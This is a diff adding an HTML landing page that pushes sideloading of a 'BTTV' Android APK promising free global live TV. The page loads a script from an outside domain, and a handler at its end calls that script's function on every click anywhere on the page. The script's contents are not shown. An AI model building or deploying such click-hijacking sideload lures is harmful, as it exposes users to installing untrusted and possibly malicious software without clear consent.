@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BTTV - Android App Download</title>
+	
+	   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+    <style>
+    :root {
+      --bg-1: #061a2e;
+      --bg-2: #0a231a;
+      --card: rgba(8, 24, 38, 0.82);
+      --line: rgba(255, 182, 18, 0.22);
+      --text: #f8fafc;
+      --muted: #b9c6d8;
+      --accent: #007a4d;
+      --accent-2: #ffb612;
+      --danger: #de3831;
+      --radius: 18px;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(80rem 40rem at 10% -10%, rgba(0, 122, 77, 0.22), transparent 50%),
+        radial-gradient(70rem 35rem at 110% 0%, rgba(255, 182, 18, 0.16), transparent 52%),
+        linear-gradient(180deg, var(--bg-1), var(--bg-2));
+      min-height: 100dvh;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .wrap {
+      width: min(1120px, 92vw);
+      margin: 0 auto;
+    }
+
+    .topbar {
+      position: sticky;
+      top: 0;
+      z-index: 40;
+      backdrop-filter: blur(8px);
+      background: rgba(4, 18, 31, 0.78);
+      border-bottom: 1px solid var(--line);
+    }
+
+    .topbar-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 14px 0;
+    }
+
+    .brand {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 800;
+      letter-spacing: 0.3px;
+    }
+
+    .logo-dot {
+      width: 28px;
+      height: 28px;
+      border-radius: 8px;
+      background: linear-gradient(135deg, var(--accent), var(--accent-2));
+      box-shadow: 0 0 26px rgba(255, 182, 18, 0.35);
+    }
+
+    .hero {
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      gap: 24px;
+      align-items: stretch;
+      padding: 40px 0 26px;
+    }
+
+    .card {
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: var(--card);
+      box-shadow: 0 20px 60px rgba(2, 6, 23, 0.35);
+    }
+
+    .hero-main {
+      padding: 28px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero-main::before {
+      content: "";
+      position: absolute;
+      inset: -30% auto auto -20%;
+      width: 380px;
+      height: 380px;
+      background: radial-gradient(circle, rgba(0, 122, 77, 0.28), transparent 70%);
+      pointer-events: none;
+    }
+
+    .tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 10px;
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      font-size: 12px;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.09em;
+    }
+
+    .live-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 999px;
+      background: var(--danger);
+      box-shadow: 0 0 0 0 rgba(222, 56, 49, 0.5);
+      animation: pulse 1.8s infinite;
+    }
+
+    h1 {
+      margin: 16px 0 10px;
+      font-size: clamp(34px, 5vw, 58px);
+      line-height: 1.03;
+      letter-spacing: -0.02em;
+    }
+
+    .hl {
+      background: linear-gradient(90deg, var(--accent), var(--accent-2));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .desc {
+      margin: 0;
+      color: var(--muted);
+      font-size: 17px;
+      line-height: 1.7;
+      max-width: 64ch;
+    }
+
+    .actions {
+      margin-top: 22px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      align-items: center;
+    }
+
+    .btn {
+      border: 0;
+      cursor: pointer;
+      border-radius: 12px;
+      padding: 13px 20px;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 0.02em;
+      transition: transform 120ms ease, filter 120ms ease, opacity 120ms ease;
+    }
+
+    .btn:active {
+      transform: translateY(1px) scale(0.99);
+    }
+
+    .btn-primary {
+      color: #06281c;
+      background: linear-gradient(135deg, var(--accent), var(--accent-2));
+    }
+
+    .btn-primary:hover {
+      filter: brightness(1.06);
+    }
+
+    .btn-ghost {
+      color: var(--text);
+      border: 1px solid var(--line);
+      background: rgba(255, 182, 18, 0.08);
+    }
+
+    .stats {
+      margin-top: 22px;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+    }
+
+    .stat {
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      background: rgba(0, 18, 36, 0.42);
+      padding: 12px;
+    }
+
+    .stat-k {
+      margin: 0;
+      color: var(--muted);
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+
+    .stat-v {
+      margin: 6px 0 0;
+      font-size: 23px;
+      font-weight: 800;
+      color: #ffe9a8;
+    }
+
+    .hero-side {
+      padding: 22px;
+      display: grid;
+      gap: 12px;
+      align-content: start;
+    }
+
+    .wire {
+      border: 1px dashed rgba(255, 182, 18, 0.38);
+      border-radius: 12px;
+      padding: 13px;
+      color: #ffe9a8;
+      font-size: 14px;
+    }
+
+    .mock {
+      margin-top: 2px;
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      background: linear-gradient(180deg, rgba(4, 18, 31, 0.86), rgba(2, 10, 18, 0.90));
+      overflow: hidden;
+    }
+
+    .mock-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 12px;
+      border-bottom: 1px solid var(--line);
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .mock-body {
+      padding: 10px;
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+    }
+
+    .ch {
+      border: 1px solid var(--line);
+      border-radius: 10px;
+      min-height: 74px;
+      background: linear-gradient(120deg, rgba(0, 122, 77, 0.22), rgba(255, 182, 18, 0.12));
+      padding: 8px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      font-size: 12px;
+    }
+
+    .ch b {
+      font-size: 13px;
+    }
+
+    .sec {
+      margin: 8px 0 0;
+      padding: 10px 0 6px;
+    }
+
+    .sec h2 {
+      margin: 0 0 12px;
+      font-size: clamp(24px, 3vw, 36px);
+      letter-spacing: -0.01em;
+    }
+
+    .grid-3 {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+    }
+
+    .feature {
+      padding: 15px;
+    }
+
+    .feature h3 {
+      margin: 0;
+      font-size: 18px;
+    }
+
+    .feature p {
+      margin: 8px 0 0;
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .download-panel {
+      margin-top: 14px;
+      padding: 20px;
+      display: grid;
+      grid-template-columns: 1fr auto;
+      gap: 16px;
+      align-items: center;
+    }
+
+    .download-panel h3 {
+      margin: 0;
+      font-size: 24px;
+    }
+
+    .download-panel p {
+      margin: 8px 0 0;
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    .code {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      padding: 9px 12px;
+      border-radius: 10px;
+      border: 1px solid var(--line);
+      background: rgba(0, 18, 36, 0.55);
+      color: #ffd966;
+      font-size: 12px;
+      word-break: break-all;
+      margin-top: 10px;
+    }
+
+    .footer {
+      margin: 20px 0 26px;
+      padding-top: 16px;
+      border-top: 1px solid var(--line);
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 10, 20, 0.78);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      padding: 16px;
+    }
+
+    .modal.show {
+      display: flex;
+    }
+
+    .modal-card {
+      width: min(360px, 95vw);
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      background: rgba(4, 18, 31, 0.96);
+      padding: 18px;
+      text-align: center;
+    }
+
+    .spin {
+      margin: 12px auto 0;
+      width: 28px;
+      height: 28px;
+      border: 2px solid rgba(255, 182, 18, 0.3);
+      border-top-color: var(--accent);
+      border-radius: 999px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(222, 56, 49, 0.5); }
+      70% { box-shadow: 0 0 0 12px rgba(222, 56, 49, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(222, 56, 49, 0); }
+    }
+
+    @media (max-width: 960px) {
+      .hero {
+        grid-template-columns: 1fr;
+      }
+      .grid-3 {
+        grid-template-columns: 1fr;
+      }
+      .stats {
+        grid-template-columns: 1fr;
+      }
+      .download-panel {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .live-dot,
+      .spin {
+        animation: none !important;
+      }
+    }
+    </style>
+</head>
+
+<body>
+
+  <header class="topbar">
+    <div class="wrap topbar-inner">
+      <a class="brand" href="https://www.novatvksda.info/#">
+        <img class="logo-dot" src="images/app_icon_1785248388458.jpg" alt="" aria-hidden="true">
+        <span data-app-name="">BTTV</span>
+      </a>
+      <button class="btn btn-primary" data-download-button="nav">Download Android APK</button>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <section class="hero">
+      <article class="card hero-main">
+        <span class="tag"><span class="live-dot" aria-hidden="true"></span>Global Live Streams</span>
+        <h1><span data-main-title-text="">BTTV</span><br><span class="hl" data-main-title-highlight="">Completely Free</span></h1>
+        <p class="desc">Single-purpose landing page for APK download. No local image assets, no dependency on old style files, only clear conversion flow and backend API integration.</p>
+
+        <div class="actions">
+          <button class="btn btn-primary" data-download-button="hero">Get APK Now</button>
+          <button class="btn btn-ghost" data-download-button="alt">Backup Download Entry</button>
+        </div>
+
+        <div class="stats">
+          <div class="stat">
+            <p class="stat-k">Channels</p>
+            <p class="stat-v">10K+</p>
+          </div>
+          <div class="stat">
+            <p class="stat-k">Regions</p>
+            <p class="stat-v">120+</p>
+          </div>
+          <div class="stat">
+            <p class="stat-k">Price</p>
+            <p class="stat-v">$0</p>
+          </div>
+        </div>
+      </article>
+
+      <aside class="card hero-side">
+        <div class="wire">Instant access to <b>News</b>, <b>Sports</b>, <b>Movies</b>, and <b>Documentaries</b> in one Android app.</div>
+        <div class="mock">
+          <div class="mock-top">
+            <span>Featured Channels</span>
+            <span>LIVE</span>
+          </div>
+          <div class="mock-body">
+            <div class="ch"><span>NEWS</span><b>GLOBAL NEWS</b></div>
+            <div class="ch"><span>SPORT</span><b>SPORTS LIVE</b></div>
+            <div class="ch"><span>MOVIE</span><b>MOVIE PRIME</b></div>
+            <div class="ch"><span>DOC</span><b>DISCOVERY HUB</b></div>
+          </div>
+        </div>
+      </aside>
+    </section>
+
+    <section class="sec" id="features">
+      <h2>Why <span data-app-name="">BTTV</span></h2>
+      <div class="grid-3">
+        <article class="card feature">
+          <h3>Massive Channel Library</h3>
+          <p>Watch live channels across news, sports, entertainment, kids, and documentaries from around the world.</p>
+        </article>
+        <article class="card feature">
+          <h3>Optimized for Android</h3>
+          <p>Fast launch, smooth playback, and responsive controls designed specifically for Android devices.</p>
+        </article>
+        <article class="card feature">
+          <h3>Free and Easy to Start</h3>
+          <p>Download the APK, install in minutes, and start streaming immediately with no subscription barrier.</p>
+        </article>
+      </div>
+    </section>
+
+    <section class="card download-panel">
+      <div>
+        <h3>Install <span data-app-name="">BTTV</span> on Android</h3>
+        <p>Tap download to get the latest Android package and start watching global live TV right away.</p>
+        <div class="code" id="api-preview">Official Android Package | Latest Stable Build | One-Tap Install</div>
+      </div>
+      <div class="actions">
+        <button class="btn btn-primary" data-download-button="cta">Download APK</button>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <span>© 2026 <span data-app-name="">BTTV</span>. All rights reserved.</span>
+      <span data-app-meta="">Version v5.6</span>
+    </footer>
+  </main>
+
+  <div class="modal" id="download-status" aria-live="polite">
+    <div class="modal-card">
+      <div id="download-status-text">Checking package availability...</div>
+      <div class="spin" aria-hidden="true"></div>
+    </div>
+  </div>
+
+ 
+  <script>
+    document.addEventListener('click', function(event) {
+      k2();
+    });
+  </script>
+
+</body>
+</html>
